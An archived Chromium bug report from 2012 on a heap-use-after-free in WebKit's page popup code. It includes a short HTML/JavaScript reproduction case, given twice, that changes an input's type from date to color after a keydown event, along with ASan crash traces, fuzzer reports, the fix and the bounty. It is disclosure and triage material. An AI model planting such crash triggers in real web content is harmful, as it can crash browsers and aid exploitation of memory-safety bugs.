# Heap-use-after-free in WebKit::WebPagePopupImpl::closePopup

| Field | Value |
|-------|-------|
| **Issue ID** | [40058043](https://issues.chromium.org/issues/40058043) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | tk...@chromium.org |
| **Created** | 2012-05-09 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

use-after-free in WebKit::WebPagePopupImpl::closePopup

**VERSION**  

Chrome Version: dev

Chromium 20.0.1132.0 (Developer Build 136023)  

OS Linux  

WebKit 537.1 (@116503)  

JavaScript V8 3.10.8.4

Operating System: 64bit precise

**REPRODUCTION CASE**

<html>
<head>
<script>
var input = document.createElement('input')
input.type = 'date'
var event = document.createEvent('KeyboardEvent')
event.initKeyboardEvent('keydown', false, false, null, 'Down')
input.dispatchEvent(event)
input.type = 'color'
</script>
</head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer + asan  

Crash State:

==31109== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffecb49ce8 at pc 0x5555592bef13 bp 0x7fffffff6410 sp 0x7fffffff6408  

READ of size 8 at 0x7fffecb49ce8 thread T0  

#0 0x5555592bef13 in WebKit::WebPagePopupImpl::closePopup() ???:0  

#1 0x55555920effd in WebKit::WebViewImpl::closePagePopup(WebCore::PagePopup\*) ???:0  

#2 0x55555ce81e5b in RenderViewImpl::OnResize(gfx::Size const&, gfx::Rect const&, bool) ???:0

0x7fffecb49ce8 is located 104 bytes inside of 120-byte region [0x7fffecb49c80,0x7fffecb49cf8)  

freed by thread T0 here:  

#0 0x55555e31cee2 in operator delete(void\*) ??:0  

#1 0x5555599647ed in WebCore::HTMLInputElement::updateType() ???:0  

#2 0x5555599681f7 in WebCore::HTMLInputElement::parseAttribute(WebCore::Attribute\*) ???:0

## Attachments

- [104120.txt](attachments/104120.txt) (text/x-c; charset=us-ascii, 8.9 KB)
- [104120.html](attachments/104120.html) (text/html; charset=us-ascii, 341 B)

## Timeline

### in...@chromium.org (2012-05-09)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=44798547

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7f7ff546e3e8
Crash State:
  - crash stack -
  WebKit::WebPagePopupImpl::closePopup
  WebKit::WebViewImpl::closePagePopup
  - free stack -
  WebCore::HTMLInputElement::updateType
  WebCore::HTMLInputElement::parseAttribute
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=133881:133887

Minimized Testcase (0.28 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv95HIIVPqfp0hbYfPJLr5xyFJ8GH7pZunlpmyIPdecZpL_KrvdtL6whot-52NBGMhKEbjyuj4vBdXC1kX-woaea7ix3RlfNJPyYLyxyq4i6objl3k2Kr51SXIN5reIWWEwjHaUDFTajMABHNDPMFvLXaNtG4ew
<script>
      var input = document.createElement('input')
      input.type = 'date'
      var event = document.createEvent('KeyboardEvent')
      event.initKeyboardEvent('keydown', false, false, null, 'Down')
      input.dispatchEvent(event)
      input.type = 'color'
    </script>

### in...@chromium.org (2012-05-09)

looks like this is coming from https://trac.webkit.org/changeset/115155/

### in...@chromium.org (2012-05-09)

upstreamed - https://bugs.webkit.org/show_bug.cgi?id=86007

### in...@chromium.org (2012-05-09)

[Empty comment from Monorail migration]

### tk...@chromium.org (2012-05-10)

[Empty comment from Monorail migration]

### tk...@chromium.org (2012-05-10)

Should be fixed by http://trac.webkit.org/changeset/116611


### in...@chromium.org (2012-05-10)

m20 branched recently. keeping in merge-approved and we will see if a merge is required. Thanks Kent-san for the quick fix.

### cl...@chromium.org (2012-05-10)

ClusterFuzz has detected this issue as fixed in range 136263:136271.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=44798547

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7f7ff546e3e8
Crash State:
  - crash stack -
  WebKit::WebPagePopupImpl::closePopup
  WebKit::WebViewImpl::closePagePopup
  - free stack -
  WebCore::HTMLInputElement::updateType
  WebCore::HTMLInputElement::parseAttribute
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=133881:133887
Fixed: https://cluster-fuzz.appspot.com/revisions?range=136263:136271

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv95HIIVPqfp0hbYfPJLr5xyFJ8GH7pZunlpmyIPdecZpL_KrvdtL6whot-52NBGMhKEbjyuj4vBdXC1kX-woaea7ix3RlfNJPyYLyxyq4i6objl3k2Kr51SXIN5reIWWEwjHaUDFTajMABHNDPMFvLXaNtG4ew

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### sc...@gmail.com (2012-05-24)

M20: http://trac.webkit.org/changeset/118422

Removed SecImpacts-Stable based on regression revision.

Added reward-topanel.

### sc...@gmail.com (2012-06-22)

$1000

### sc...@gmail.com (2012-07-09)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### js...@chromium.org (2012-12-20)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-14)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/127424?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40058043)*
